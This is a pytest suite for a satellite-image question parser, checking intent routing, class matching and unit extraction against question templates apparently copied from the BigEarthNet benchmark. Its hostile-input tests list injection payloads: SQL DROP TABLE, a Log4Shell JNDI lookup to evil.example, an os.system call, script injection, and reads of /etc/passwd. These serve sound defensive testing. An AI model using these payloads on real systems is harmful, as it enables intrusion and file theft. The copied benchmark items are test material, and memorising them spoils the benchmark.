"""Q1 query parser: golden questions per intent, extraction, and hostile input.

Golden questions are **real templates copied from BigEarthNet.txt train/validation**, not
invented phrasings — a parser tested only against wording its author imagined proves nothing
about the benchmark. Where a question is constructed (injection strings, oversized input) it is
marked SYNTHETIC per CLAUDE.md §7.

Several assertions here encode defects measured at S9 and would have caught them:

- `sea` matched *inside* the word "season", rewriting every ``mcq|season`` stem and driving that
  task's precision to **0.00%**;
- the class name *"Land principally occupied by agriculture, with significant areas of natural
  vegetation"* contains "occupied" and "areas" and fired two AREA cues on its own, sending 151
  presence questions to the wrong intent;
- ``m^2`` — a third of all m² spellings in the data — was not matched at all, which drops the
  stated value rather than merely misrouting;
- MCQ stems ending in ``:`` rather than ``?`` left the whole option list inside the stem.
"""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from satquery.routing import AnswerFormat, Intent, ParseFailure, QuerySpec, parse_query
from satquery.routing.parser import _find_classes
from satquery.taxonomy import load_synonyms

pytestmark = pytest.mark.unit


@pytest.fixture(scope="module")
def syn():
    return load_synonyms()


def _spec(q: str, syn) -> QuerySpec:
    got = parse_query(q, syn)
    assert isinstance(got, QuerySpec), f"expected a parse, got {got!r}"
    return got


# --------------------------------------------------------------------------- golden set ----
GOLDEN: list[tuple[str, Intent]] = [
    # binary | presence
    ("Is there any broad-leaved forest in the image?", Intent.PRESENCE),
    ("Can you identify inland waters in the satellite image?", Intent.PRESENCE),
    ("Does the image capture complex cultivation patterns?", Intent.PRESENCE),
    ("Would you classify part of this image as coniferous forest?", Intent.PRESENCE),
    # binary | count
    ("Is there only a single continuous region of pastures visible in the image?", Intent.COUNT),
    ("Does this image include exactly three connected zones of arable lands?", Intent.COUNT),
    ("Do broad-leaved forests occupy two or less continuous areas in the image?", Intent.COUNT),
    # binary | area
    ("Do pastures account for less than 1008000 m^2 of the image?", Intent.AREA),
    ("Do broad-leaved forests take up between 864000 m^2 and 1152000 m^2 of the image?",
     Intent.AREA),
    ("Does urban fabric cover more than 30% of the image?", Intent.AREA),
    # binary | adjacency — the nine measured synonyms plus paraphrases
    ("Is any broad-leaved forest and pastures side by side in the image?", Intent.ADJACENCY),
    ("Does any inland water lie right up against a mixed forest?", Intent.ADJACENCY),
    ("Does any coniferous forest physically connect to urban fabrics in the image?",
     Intent.ADJACENCY),
    ("Does any inland water and marine waters share a common boundary?", Intent.ADJACENCY),
    # mcq
    ("Which season is depicted in the satelltite image? a) Spring, b) Autumn, c) Winter, "
     "d) Summer", Intent.METADATA_MCQ),
    ("Which of the following countries does this image represent? a) Switzerland, b) Austria, "
     "c) Belgium, d) Finland", Intent.METADATA_MCQ),
    ("Which of the following climate zones does this image represent? a) Polar, tundra, "
     "b) Temperate, no dry season, warm summer, c) Cold, dry summer, d) Arid, steppe",
     Intent.METADATA_MCQ),
    ("Select the class present in the image from the following: a) Mixed forest, "
     "b) Agro-forestry areas, c) Arable land, d) Pastures", Intent.PRESENCE),
    ("What is the relative position of the pastures to the arable land? a) to the top, "
     "b) to the bottom, c) to the left, d) to the right", Intent.RELATIVE_POSITION),
    ("Which direction describes the spatial relationship of the broad-leaved forest relative "
     "to the mixed forest? a) to the top-right, b) to the bottom, c) to the left, "
     "d) to the top", Intent.RELATIVE_POSITION),
    # captioning
    ("Describe the satellite scene, including the region, time of year, and land cover "
     "classes.", Intent.CAPTION),
    ("Explain what this satellite image shows, mentioning the location, season, and landscape "
     "features.", Intent.CAPTION),
    ("Give a detailed overview of the image content, including the geographic location and "
     "land cover features.", Intent.CAPTION),
]


class TestGoldenIntents:
    @pytest.mark.parametrize(("question", "want"), GOLDEN, ids=lambda v: getattr(v, "value", ""))
    def test_intent(self, question, want, syn) -> None:
        assert _spec(question, syn).intent is want

    def test_referring_expression_uses_the_ref_tag(self, syn) -> None:
        got = _spec("Give the bounding box of the <ref>largest patch of broad-leaved "
                    "forest</ref>.", syn)
        assert got.intent is Intent.REFERRING_EXPR
        assert got.class_a == "Broad-leaved forest"
        assert got.qualifier == "largest"
        assert got.answer_format is AnswerFormat.BBOX

    def test_referring_expression_without_a_qualifier(self, syn) -> None:
        """~55% of referring expressions carry no qualifier (ANSWER_GRAMMAR §10)."""
        got = _spec("Give the bounding box of the <ref>inland waters</ref>.", syn)
        assert got.qualifier is None
        assert got.class_a == "Inland waters"

    def test_referring_point_extracts_the_coordinate(self, syn) -> None:
        got = _spec("What is at <point>(0.42 0.67)</point> in the image?", syn)
        assert got.intent is Intent.REFERRING_POINT
        assert got.point == (0.42, 0.67)


class TestAnswerFormat:
    def test_binary_questions_answer_yes_no(self, syn) -> None:
        assert _spec("Is there any pastures in the image?", syn).answer_format \
            is AnswerFormat.YES_NO

    def test_mcq_questions_answer_a_letter(self, syn) -> None:
        got = _spec("What is the relative position of the pastures to the arable land? "
                    "a) to the top, b) to the bottom, c) to the left, d) to the right", syn)
        assert got.answer_format is AnswerFormat.MCQ_LETTER

    def test_captions_answer_free_text(self, syn) -> None:
        assert _spec("Describe the satellite scene.", syn).answer_format \
            is AnswerFormat.FREE_TEXT


class TestClassResolution:
    def test_longest_form_wins_so_no_phantom_second_class(self, syn) -> None:
        """"inland waters" must not also match "waters" and invent a class_b."""
        got = _spec("Is there any inland waters in the image?", syn)
        assert got.class_a == "Inland waters"
        assert got.class_b is None

    @pytest.mark.parametrize("word", ["season", "seasons", "research", "suburban", "downtown"])
    def test_short_forms_do_not_match_inside_longer_words(self, word, syn) -> None:
        """MEASURED DEFECT: `sea` matched inside "season", `urban` inside "suburban".

        14 surface forms are short enough for this. Substring matching rewrote every
        ``mcq|season`` stem to " _CLASS_ son" and took that task's precision to 0.00%.
        """
        assert _find_classes(f"the {word} of the image", syn) == []

    def test_the_word_sea_alone_still_resolves(self, syn) -> None:
        """The boundary fix must not break the legitimate match it guards."""
        assert _find_classes("the sea in the image", syn) != []

    def test_class_name_is_not_read_as_an_intent_cue(self, syn) -> None:
        """MEASURED DEFECT worth 151 misroutes.

        "Land principally occupied by agriculture, with significant areas of natural
        vegetation" contains both "occupied" and "areas". Read as raw text it fires two AREA
        cues, so a presence question about that class became an area question.
        """
        got = _spec("Is there any land principally occupied by agriculture, with significant "
                    "areas of natural vegetation in the image?", syn)
        assert got.intent is Intent.PRESENCE

    def test_comma_variants_of_a_class_name_resolve(self, syn) -> None:
        """Real questions write the class both with and without its comma."""
        with_comma = _spec("Is there any land principally occupied by agriculture, with "
                           "significant areas of natural vegetation in the image?", syn)
        without = _spec("Is there any land principally occupied by agriculture with "
                        "significant areas of natural vegetation in the image?", syn)
        assert with_comma.class_a == without.class_a is not None

    def test_adjacency_resolves_both_classes(self, syn) -> None:
        got = _spec("Is any broad-leaved forest and pastures side by side in the image?", syn)
        assert got.class_a == "Broad-leaved forest"
        assert got.class_b == "Pastures"


class TestStatedValueExtraction:
    @pytest.mark.parametrize(
        ("question", "want_pct"),
        [("Does urban fabric cover more than 30% of the image?", 30.0),
         ("Does urban fabric cover more than 30 percent of the image?", 30.0),
         ("Do pastures cover at least 720000 m2 of the image?", 50.0),
         ("Do pastures cover at least 720000 m^2 of the image?", 50.0),
         ("Do pastures cover at least 720000 m² of the image?", 50.0),
         ("Do pastures cover at least 720,000 sq m of the image?", 50.0),
         ("Do pastures cover at least 720000 square metres of the image?", 50.0)],
    )
    def test_every_measured_unit_spelling_normalises_to_percent(
        self, question, want_pct, syn
    ) -> None:
        """MEASURED: `m2` 127, `m^2` 109, `sq m` 97 occurrences in 600 sampled questions.

        Missing a spelling does not merely misroute — it drops the stated value while still
        routing to AREA, which yields a wrong answer instead of an honest abstention.
        """
        got = _spec(question, syn)
        assert got.stated_value is not None, "no value extracted"
        assert got.stated_value.as_percent == pytest.approx(want_pct, abs=0.01)

    def test_thousands_separators_are_handled(self, syn) -> None:
        got = _spec("Do pastures cover at least 1,008,000 m2 of the image?", syn)
        assert got.stated_value is not None
        assert got.stated_value.value == 1_008_000.0

    def test_count_stated_as_a_number_word(self, syn) -> None:
        got = _spec("Does this image include exactly three connected zones of arable lands?",
                    syn)
        assert got.intent is Intent.COUNT
        assert got.stated_value is not None
        assert got.stated_value.value == 3.0
        assert got.comparator == "eq"

    @pytest.mark.parametrize(
        ("question", "want"),
        [("Do pastures cover at least 30% of the image?", "ge"),
         ("Do pastures cover at most 30% of the image?", "le"),
         ("Do pastures cover more than 30% of the image?", "gt"),
         ("Do pastures cover less than 30% of the image?", "lt"),
         ("Do pastures cover exactly 30% of the image?", "eq")],
    )
    def test_comparators(self, question, want, syn) -> None:
        assert _spec(question, syn).comparator == want

    def test_between_yields_both_bounds(self, syn) -> None:
        got = _spec("Do broad-leaved forests take up between 864000 m^2 and 1152000 m^2 of "
                    "the image?", syn)
        assert got.comparator == "between"
        assert got.stated_value is not None and got.stated_upper is not None
        assert got.stated_value.value == 864_000.0
        assert got.stated_upper.value == 1_152_000.0


class TestOptionExtraction:
    def test_four_options_are_extracted(self, syn) -> None:
        got = _spec("Which season is depicted in the image? a) Spring, b) Autumn, c) Winter, "
                    "d) Summer", syn)
        assert set(got.options) == {"a", "b", "c", "d"}
        assert got.options["a"] == "Spring"
        assert got.options["d"] == "Summer"

    def test_a_colon_stem_still_splits_options_off(self, syn) -> None:
        """MEASURED DEFECT worth 68 misroutes: not every MCQ stem ends with "?"."""
        got = _spec("Select the class present in the image from the following: a) Mixed "
                    "forest, b) Agro-forestry areas, c) Arable land, d) Pastures", syn)
        assert len(got.options) == 4
        assert got.intent is Intent.PRESENCE

    def test_options_do_not_leak_into_the_intent(self, syn) -> None:
        """An option reading "to the left" must not make a presence MCQ positional."""
        got = _spec("Which class appears in the image? a) Coniferous forest, b) Mixed forest, "
                    "c) Arable land, d) Pastures", syn)
        assert got.intent is Intent.PRESENCE

    def test_mcq_classes_may_come_from_the_options(self, syn) -> None:
        """The stem often names no class at all; the candidates ARE the options."""
        got = _spec("Which classes share a boundary? a) Broad-leaved forest and Pastures, "
                    "b) Mixed forest and Arable land, c) Pastures and Arable land, "
                    "d) Mixed forest and Pastures", syn)
        assert got.intent is Intent.ADJACENCY
        assert got.class_a is not None and got.class_b is not None


class TestAbstention:
    """The parser declines rather than guessing. S8 measured what that is worth."""

    def test_empty_string(self, syn) -> None:
        got = parse_query("", syn)
        assert isinstance(got, ParseFailure) and "empty" in got.reason

    def test_whitespace_only(self, syn) -> None:
        assert isinstance(parse_query("   \n\t ", syn), ParseFailure)

    def test_very_long_input_is_refused_not_truncated(self, syn) -> None:
        got = parse_query("Is there any pastures? " + "x" * 5000, syn)
        assert isinstance(got, ParseFailure) and "4000" in got.reason

    def test_no_class_mentioned(self, syn) -> None:
        got = parse_query("Is there anything at all in the image?", syn)
        assert isinstance(got, ParseFailure)

    def test_gibberish(self, syn) -> None:
        assert isinstance(parse_query("qwertyuiop asdfghjkl", syn), ParseFailure)

    def test_a_failure_carries_the_reason_and_the_question(self, syn) -> None:
        got = parse_query("", syn)
        assert isinstance(got, ParseFailure)
        assert got.reason and got.question is not None


class TestHostileInput:
    """SYNTHETIC adversarial strings. Input is DATA and is never executed.

    CLAUDE.md §1 forbids ``eval``/``exec``/dynamic dispatch anywhere on the routing path, so
    these must come back as an ordinary parse or an ordinary abstention — never as an effect.
    """

    HOSTILE = [
        "'; DROP TABLE annotations; --",
        "{{7*7}}",
        "${jndi:ldap://evil.example/a}",
        "__import__('os').system('echo pwned')",
        "<script>alert(1)</script>",
        "../../../../etc/passwd",
        "\x00\x01\x02 null bytes",
        "eval(open('/etc/passwd').read())",
        "Is there any pastures in the image? '; DROP TABLE x; --",
        "<ref>__import__('os')</ref>",
    ]

    @pytest.mark.parametrize("payload", HOSTILE)
    def test_treated_as_text_never_executed(self, payload, syn) -> None:
        got = parse_query(payload, syn)
        assert isinstance(got, QuerySpec | ParseFailure)

    def test_an_injection_riding_a_valid_question_does_not_change_the_intent(self, syn) -> None:
        clean = _spec("Is there any pastures in the image?", syn)
        dirty = parse_query("Is there any pastures in the image? '; DROP TABLE x; --", syn)
        assert isinstance(dirty, QuerySpec)
        assert dirty.intent is clean.intent
        assert dirty.class_a == clean.class_a

    def test_option_markers_inside_an_injection_do_not_forge_an_mcq(self, syn) -> None:
        got = parse_query("Is there any pastures? a) yes b) no c) maybe d) '; DROP TABLE x --",
                          syn)
        assert isinstance(got, QuerySpec | ParseFailure)


class TestDeterminism:
    def test_the_same_question_always_parses_identically(self, syn) -> None:
        q = ("Is any broad-leaved forest and pastures side by side in the image?")
        first = _spec(q, syn)
        for _ in range(50):
            assert _spec(q, syn) == first

    def test_queryspec_is_immutable(self, syn) -> None:
        """A boundary object downstream components share must not be mutable in place."""
        got = _spec("Is there any pastures in the image?", syn)
        with pytest.raises(ValidationError):
            got.intent = Intent.AREA          # type: ignore[misc]


class TestMetadataIsNeverAnInput:
    """CLAUDE.md §7: country / season / climate_zone are ANSWER LABELS, never model inputs."""

    @pytest.mark.parametrize("q", [
        "Which season is depicted in the satelltite image? a) Spring, b) Autumn, c) Winter, "
        "d) Summer",
        "Which of the following countries does this image represent? a) Switzerland, "
        "b) Austria, c) Belgium, d) Finland",
    ])
    def test_metadata_specs_carry_no_land_cover_class(self, q, syn) -> None:
        got = _spec(q, syn)
        assert got.intent is Intent.METADATA_MCQ
        assert got.class_a is None and got.class_b is None
